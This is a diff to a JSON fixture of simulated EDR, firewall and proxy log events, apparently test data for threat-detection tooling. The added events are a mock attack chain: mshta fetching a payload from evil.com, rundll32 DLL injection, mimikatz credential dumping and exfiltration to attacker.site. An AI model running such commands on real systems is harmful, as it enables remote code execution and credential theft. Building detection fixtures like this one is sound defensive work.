@@ -1,24 +1,56 @@
 [
   {
-    "timestamp": "2025-05-18T10:00:00",
-    "process_name": "fodhelper.exe",
-    "parent_proc": "explorer.exe",
-    "command_line": "fodhelper.exe /c evil.exe",
+    "timestamp": "2025-05-20T14:10:10",
     "source_type": "edr",
-    "vendor": "velociraptor"
+    "vendor": "velociraptor",
+    "process_name": "mshta.exe",
+    "command_line": "mshta http://evil.com/payload.hta",
+    "username": "user01",
+    "src_ip": "192.168.100.10"
   },
   {
-    "timestamp": "2025-05-18T10:00:15",
-    "command_line": "etwti -disable",
-    "process_name": "etwti.exe",
+    "timestamp": "2025-05-20T14:10:15",
     "source_type": "edr",
-    "vendor": "velociraptor"
+    "vendor": "velociraptor",
+    "process_name": "powershell.exe",
+    "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
+    "username": "user01",
+    "src_ip": "192.168.100.10"
   },
   {
-    "timestamp": "2025-05-18T10:00:30",
-    "command_line": "rundll32.exe shell32.dll,Control_RunDLL",
+    "timestamp": "2025-05-20T14:10:25",
+    "source_type": "edr",
+    "vendor": "velociraptor",
     "process_name": "rundll32.exe",
+    "command_line": "rundll32 my.dll,Inject",
+    "username": "user01",
+    "src_ip": "192.168.100.10"
+  },
+  {
+    "timestamp": "2025-05-20T14:10:40",
     "source_type": "edr",
-    "vendor": "velociraptor"
+    "vendor": "velociraptor",
+    "process_name": "mimikatz.exe",
+    "command_line": "sekurlsa::logonpasswords",
+    "username": "user01",
+    "src_ip": "192.168.100.10"
+  },
+  {
+    "timestamp": "2025-05-20T14:10:50",
+    "source_type": "fw",
+    "vendor": "pfsense",
+    "src_ip": "192.168.100.10",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 443,
+    "protocol": "tcp",
+    "action": "allow"
+  },
+  {
+    "timestamp": "2025-05-20T14:11:00",
+    "source_type": "proxy",
+    "vendor": "squid",
+    "client_ip": "192.168.100.10",
+    "url": "http://attacker.site/exfil/data.zip",
+    "status": "TCP_MISS/200"
   }
 ]
